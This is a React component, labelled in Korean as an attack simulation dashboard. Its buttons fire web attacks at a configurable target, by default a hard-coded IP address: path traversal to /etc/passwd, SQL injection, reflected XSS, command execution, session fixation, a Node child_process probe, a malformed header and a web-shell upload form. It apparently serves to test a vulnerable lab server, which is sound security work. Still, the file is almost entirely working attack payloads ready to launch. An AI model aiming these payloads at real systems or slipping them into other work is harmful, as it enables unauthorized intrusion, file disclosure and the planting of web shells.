import React, { useState } from "react";

export default function AttackDashboard() {
  const [targetUrl, setTargetUrl] = useState("http://4.218.12.62:5001");

  const handleAttack = async (endpoint: string, options: RequestInit = {}) => {
    try {
      const res = await fetch(`${targetUrl}${endpoint}`, options);
      const text = await res.text();
      alert(`응답:\n${text}`);
    } catch (err) {
      alert(`에러: ${err}`);
    }
  };

  return (
    <div className="p-4 space-y-4 text-left">
      <h1 className="text-2xl font-bold">🔥 공격 시뮬레이션 대시보드</h1>

      <label>
        Target URL:{" "}
        <input
          type="text"
          className="border px-2 py-1"
          value={targetUrl}
          onChange={(e) => setTargetUrl(e.target.value)}
        />
      </label>

      <button onClick={() => handleAttack(`/download?file=../../../etc/passwd`)}>
        🗂 Path Traversal
      </button>

      <button onClick={() => handleAttack(`/login?username=admin'--&password=1`)}>
        🐍 SQL Injection
      </button>

      <button onClick={() => handleAttack(`/search?q=<script>alert('xss')</script>`)}>
        💬 XSS 테스트
      </button>

      <button onClick={() => handleAttack(`/run?cmd=ls`)}>
        ⚙️ RCE 테스트
      </button>

      <button
        onClick={() =>
          handleAttack(`/login`, {
            method: "POST",
            body: JSON.stringify({ username: "admin", password: "1234" }),
            headers: {
              "Content-Type": "application/json",
              "X-Custom-Header": "\x00InvalidHeader",
            },
          })
        }
      >
        📛 Malformed Header
      </button>
      <button onClick={() => handleAttack(`/fixsession?session=ABCDEF123456`)}>
        🧪 Session Fixation
      </button>

      <button
        onClick={() =>
          handleAttack(`/method-check`, {
            method: "DELETE",
          })
        }
      >
        🚫 Method 제약 테스트 (DELETE 요청)
      </button>

      <button onClick={() => handleAttack(`/node-attack?code=require('child_process')`)}>
        🐢 Node.js 기반 공격 테스트
      </button>
      <form
        onSubmit={(e) => {
          e.preventDefault();
          const fileInput = (e.target as any).elements["file"];
          const formData = new FormData();
          formData.append("file", fileInput.files[0]);

          fetch(`${targetUrl}/upload`, {
            method: "POST",
            body: formData,
          })
            .then((res) => res.text())
            .then((txt) => alert(txt))
            .catch((err) => alert(err));
        }}
      >
        <p>📤 웹쉘 업로드</p>
        <input type="file" name="file" />
        <button type="submit">업로드</button>
      </form>

      
    </div>

    
  );
}